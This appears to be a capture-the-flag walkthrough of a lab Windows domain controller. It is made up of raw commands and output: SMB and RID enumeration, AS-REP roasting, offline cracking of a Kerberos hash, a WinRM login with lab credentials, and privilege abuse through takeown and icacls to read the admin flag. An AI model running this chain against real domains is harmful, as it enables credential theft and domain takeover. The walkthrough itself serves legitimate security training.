
## Scanning & Enumeration

```
nmap -sV -O 10.48.134.93     
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-18 15:32 -0400
Nmap scan report for 10.48.134.93
Host is up (0.084s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-18 19:39:25Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows



```


## User Enumeration

```
nxc smb 10.48.134.93 -u 'guest' -p '' --shares 
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\guest: 
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  [*] Enumerated shares
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  Share           Permissions     Remark
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  -----           -----------     ------
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  ADMIN$                          Remote Admin
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  C$                              Default share
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  NETLOGON                        Logon server share 
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  SYSVOL                          Logon server share 
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ            VulnNet Business Sharing
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ            VulnNet Enterprise Sharing

```

```
nxc smb 10.48.134.93 -u 'guest' -p '' --rid-brute
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\guest: 
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  500: VULNNET-RST\Administrator (SidTypeUser)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  501: VULNNET-RST\Guest (SidTypeUser)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  502: VULNNET-RST\krbtgt (SidTypeUser)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  512: VULNNET-RST\Domain Admins (SidTypeGroup)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  513: VULNNET-RST\Domain Users (SidTypeGroup)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  514: VULNNET-RST\Domain Guests (SidTypeGroup)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  515: VULNNET-RST\Domain Computers (SidTypeGroup)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  516: VULNNET-RST\Domain Controllers (SidTypeGroup)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  517: VULNNET-RST\Cert Publishers (SidTypeAlias)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  518: VULNNET-RST\Schema Admins (SidTypeGroup)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  525: VULNNET-RST\Protected Users (SidTypeGroup)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  526: VULNNET-RST\Key Admins (SidTypeGroup)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  1105: VULNNET-RST\a-whitehat (SidTypeUser)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  1109: VULNNET-RST\t-skid (SidTypeUser)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  1110: VULNNET-RST\j-goldenhand (SidTypeUser)
SMB         10.48.134.93    445    WIN-2BO8M1OE1M1  1111: VULNNET-RST\j-leet (SidTypeUser)

```

```
cat << 'EOF' > users.txt
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
EOF
  
```


```
impacket-GetNPUsers vulnnet-rst.local/ -usersfile users.txt -format hashcat -outputfile hashes.asrep -dc-ip 10.48.134.93
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:510c1091dc143725d526c7f7bf08292c$787a133ceaab0bdd923fd9d5d6d0ca09941561b58f872818117a05123b57687036e14bf88cc3dcd08ee652905c543ed7453adafa9a7c70beef7c696e403feace490ff23fe4ad779d494c73ea0540972748a5f7fcb035ec7f0ff1f7bed8ef7927d96c565e16bf6a395b57a320d76de1fd669c1b831921c8739d615dbdc81f07924adb0ebc6e3ea888ac99eb2322a8cde8389a430d562d19856a785944420ee113a4fb60c0cc093dc69d7915faebe3d2b00c23f6399567d16f1c24f87588f49c8697623feffde76918d26d62201f41cca7f54537be7379a41acbf3cc3abc33ee1f7b90b233d3ca3af89668648564c54ac255f645c830b4
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set

```


```
 cat hashes.asrep
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:510c1091dc143725d526c7f7bf08292c$787a133ceaab0bdd923fd9d5d6d0ca09941561b58f872818117a05123b57687036e14bf88cc3dcd08ee652905c543ed7453adafa9a7c70beef7c696e403feace490ff23fe4ad779d494c73ea0540972748a5f7fcb035ec7f0ff1f7bed8ef7927d96c565e16bf6a395b57a320d76de1fd669c1b831921c8739d615dbdc81f07924adb0ebc6e3ea888ac99eb2322a8cde8389a430d562d19856a785944420ee113a4fb60c0cc093dc69d7915faebe3d2b00c23f6399567d16f1c24f87588f49c8697623feffde76918d26d62201f41cca7f54537be7379a41acbf3cc3abc33ee1f7b90b233d3ca3af89668648564c54ac255f645c830b4

```

```
 hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i5-1335U, 2463/4926 MB (1024 MB allocatable), 7MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (4354 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:510c1091dc143725d526c7f7bf08292c$787a133ceaab0bdd923fd9d5d6d0ca09941561b58f872818117a05123b57687036e14bf88cc3dcd08ee652905c543ed7453adafa9a7c70beef7c696e403feace490ff23fe4ad779d494c73ea0540972748a5f7fcb035ec7f0ff1f7bed8ef7927d96c565e16bf6a395b57a320d76de1fd669c1b831921c8739d615dbdc81f07924adb0ebc6e3ea888ac99eb2322a8cde8389a430d562d19856a785944420ee113a4fb60c0cc093dc69d7915faebe3d2b00c23f6399567d16f1c24f87588f49c8697623feffde76918d26d62201f41cca7f54537be7379a41acbf3cc3abc33ee1f7b90b233d3ca3af89668648564c54ac255f645c830b4:tj072889*
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:510c1091dc14...c830b4
Time.Started.....: Thu Jun 18 16:22:23 2026 (3 secs)
Time.Estimated...: Thu Jun 18 16:22:26 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   978.8 kH/s (2.44ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3182592/14344385 (22.19%)
Rejected.........: 0/3182592 (0.00%)
Restore.Point....: 3175424/14344385 (22.14%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: tjohari -> titicakes13
Hardware.Mon.#01.: Util: 26%

Started: Thu Jun 18 16:22:20 2026
Stopped: Thu Jun 18 16:22:28 2026

```


```
hashcat -m 18200 hashes.asrep --show
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:510c1091dc143725d526c7f7bf08292c$787a133ceaab0bdd923fd9d5d6d0ca09941561b58f872818117a05123b57687036e14bf88cc3dcd08ee652905c543ed7453adafa9a7c70beef7c696e403feace490ff23fe4ad779d494c73ea0540972748a5f7fcb035ec7f0ff1f7bed8ef7927d96c565e16bf6a395b57a320d76de1fd669c1b831921c8739d615dbdc81f07924adb0ebc6e3ea888ac99eb2322a8cde8389a430d562d19856a785944420ee113a4fb60c0cc093dc69d7915faebe3d2b00c23f6399567d16f1c24f87588f49c8697623feffde76918d26d62201f41cca7f54537be7379a41acbf3cc3abc33ee1f7b90b233d3ca3af89668648564c54ac255f645c830b4:tj072889*

```


```
 nxc smb 10.48.134.139  -u 't-skid' -p 'tj072889*' --shares
SMB         10.48.134.139   445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                             
SMB         10.48.134.139   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\t-skid:tj072889* 
SMB         10.48.134.139   445    WIN-2BO8M1OE1M1  [*] Enumerated shares
SMB         10.48.134.139   445    WIN-2BO8M1OE1M1  Share           Permissions     Remark
SMB         10.48.134.139   445    WIN-2BO8M1OE1M1  -----           -----------     ------
SMB         10.48.134.139   445    WIN-2BO8M1OE1M1  ADMIN$                          Remote Admin
SMB         10.48.134.139   445    WIN-2BO8M1OE1M1  C$                              Default share
SMB         10.48.134.139   445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC
SMB         10.48.134.139   445    WIN-2BO8M1OE1M1  NETLOGON        READ            Logon server share 
SMB         10.48.134.139   445    WIN-2BO8M1OE1M1  SYSVOL          READ            Logon server share 
SMB         10.48.134.139   445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ            VulnNet Business Sharing
SMB         10.48.134.139   445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ            VulnNet Enterprise Sharing

```

```
smbclient //10.48.134.139/NETLOGON -U 't-skid'
Password for [WORKGROUP\t-skid]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Mar 16 19:15:49 2021
  ..                                  D        0  Tue Mar 16 19:15:49 2021
  ResetPassword.vbs                   A     2821  Tue Mar 16 19:18:14 2021

                8771839 blocks of size 4096. 4492701 blocks available
smb: \> get ResetPassword.vbs 
getting file \ResetPassword.vbs of size 2821 as ResetPassword.vbs (4.5 KiloBytes/sec) (average 4.5 KiloBytes/sec)
smb: \> The connection is disconnected now: NT_STATUS_CONNECTION_DISCONNECTED


```

```
evil-winrm -i 10.48.134.139 -u 'a-whitehat' -p 'bNdKVkjv3RR9ht'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\a-whitehat\Documents> dir
*Evil-WinRM* PS C:\Users\a-whitehat\Documents> cd ..
*Evil-WinRM* PS C:\Users\a-whitehat> dir


    Directory: C:\Users\a-whitehat


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018  12:19 AM                Desktop
d-r---        6/18/2026   2:07 PM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos


*Evil-WinRM* PS C:\Users\a-whitehat> cd Desktop
*Evil-WinRM* PS C:\Users\a-whitehat\Desktop> dir
*Evil-WinRM* PS C:\Users\a-whitehat\Desktop> ls
*Evil-WinRM* PS C:\Users\a-whitehat\Desktop> cd ..
*Evil-WinRM* PS C:\Users\a-whitehat> cd ..
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/18/2026   2:07 PM                a-whitehat
d-----        3/13/2021   3:20 PM                Administrator
d-----        3/13/2021   3:42 PM                enterprise-core-vn
d-r---        3/11/2021   7:36 AM                Public


*Evil-WinRM* PS C:\Users> cd enterprise-core-vn
*Evil-WinRM* PS C:\Users\enterprise-core-vn> dir


    Directory: C:\Users\enterprise-core-vn


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/13/2021   3:43 PM                Desktop
d-r---        3/13/2021   3:42 PM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos


*Evil-WinRM* PS C:\Users\enterprise-core-vn> cd Destop
Cannot find path 'C:\Users\enterprise-core-vn\Destop' because it does not exist.
At line:1 char:1
+ cd Destop
+ ~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\enterprise-core-vn\Destop:String) [Set-Location], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
*Evil-WinRM* PS C:\Users\enterprise-core-vn> cd Desktop
 
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> dir 


    Directory: C:\Users\enterprise-core-vn\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:43 PM             39 user.txt


*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> type user.txt
THM{726b7c0baaac1455d05c827b5561f4ed}
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> cd ..

```

```
*Evil-WinRM* PS C:\Users\enterprise-core-vn> cd ..
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/18/2026   2:07 PM                a-whitehat
d-----        3/13/2021   3:20 PM                Administrator
d-----        3/13/2021   3:42 PM                enterprise-core-vn
d-r---        3/11/2021   7:36 AM                Public


*Evil-WinRM* PS C:\Users> Administrator
 
^[The term 'Administrator' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ Administrator
+ ~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Administrator:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\Users> cd Administrator
 
*Evil-WinRM* PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/11/2021   9:38 AM                3D Objects
d-r---        3/11/2021   9:38 AM                Contacts
d-r---        3/13/2021   3:31 PM                Desktop
d-r---        3/11/2021   9:38 AM                Documents
d-r---        3/11/2021   9:38 AM                Downloads
d-r---        3/11/2021   9:38 AM                Favorites
d-r---        3/11/2021   9:38 AM                Links
d-r---        3/11/2021   9:38 AM                Music
d-r---        3/11/2021   9:38 AM                Pictures
d-r---        3/11/2021   9:38 AM                Saved Games
d-r---        3/11/2021   9:38 AM                Searches
d-r---        3/11/2021   9:38 AM                Videos


*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:34 PM             39 system.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type system.txt
Access to the path 'C:\Users\Administrator\Desktop\system.txt' is denied.
At line:1 char:1
+ type system.txt
+ ~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Admini...ktop\system.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
*Evil-WinRM* PS C:\Users\Administrator\Desktop> SeTakeOwnershipPrivilege
The term 'SeTakeOwnershipPrivilege' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ SeTakeOwnershipPrivilege
+ ~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (SeTakeOwnershipPrivilege:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\Users\Administrator\Desktop> takeown /f 'C:\Users\Administrator\Desktop\system.txt'

SUCCESS: The file (or folder): "C:\Users\Administrator\Desktop\system.txt" now owned by user "VULNNET-RST\a-whitehat".
*Evil-WinRM* PS C:\Users\Administrator\Desktop> icacls 'C:\Users\Administrator\Desktop\system.txt' /grant a-whitehat:F
processed file: C:\Users\Administrator\Desktop\system.txt
Successfully processed 1 files; Failed processing 0 files
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:34 PM             39 system.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type system.txt
THM{16f45e3934293a57645f8d7bf71d8d4c}
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 



```





